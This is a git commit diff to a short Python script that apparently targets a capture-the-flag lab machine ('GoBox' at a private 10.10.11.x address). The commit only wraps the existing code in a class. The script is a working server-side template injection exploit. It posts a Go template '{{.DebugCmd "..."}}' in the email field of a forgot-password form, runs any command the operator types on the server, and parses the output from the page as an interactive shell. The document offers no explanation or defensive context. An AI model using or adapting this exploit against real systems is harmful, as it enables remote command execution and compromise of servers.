105665f02ceb0109fad9cbdf0a6a2f37a2154637
Adrian <hadrian3689@gmail.com>
2022-01-11 23:29:46 -0500

    Added clases

--- fileread.py
+++ fileread.py
@@ -1,22 +1,28 @@
 import requests
 import re
 
-url = 'http://10.10.11.113:8080/forgot/'
+class GoBox():
+    def __init__(self,url):
+        self.url = url
+        self.shell()
 
-while True:
-    try:
-        debug = '{{.DebugCmd "'
-        command = input("$> ")
-        debug_cmd = debug + command + '"}}'
-        data = {
-            "email":debug_cmd
-        }
-        req_site = requests.post(url,data=data)
-        search = re.compile(r"Email Sent To: (.*?)\s+<button class", re.DOTALL) 
-        output_text = search.search(req_site.text).group(1)
-        print(output_text)
+    def shell(self):
+        while True:
+            try:
+                debug = '{{.DebugCmd "'
+                command = input("$GO> ")
+                debug_cmd = debug + command + '"}}'
+                data = {
+                    "email":debug_cmd
+                }
+                req_site = requests.post(self.url,data=data)
+                search = re.compile(r"Email Sent To: (.*?)\s+<button class", re.DOTALL)
+                output_text = search.search(req_site.text).group(1)
+                print(output_text + "\n")
+            except KeyboardInterrupt:
+                print("\nBye Bye!")
+                exit()
 
-
-
-    except KeyboardInterrupt:
-        exit() 
+if __name__ == "__main__":
+     url = 'http://10.10.11.113:8080/forgot/'
+     GoBox(url)
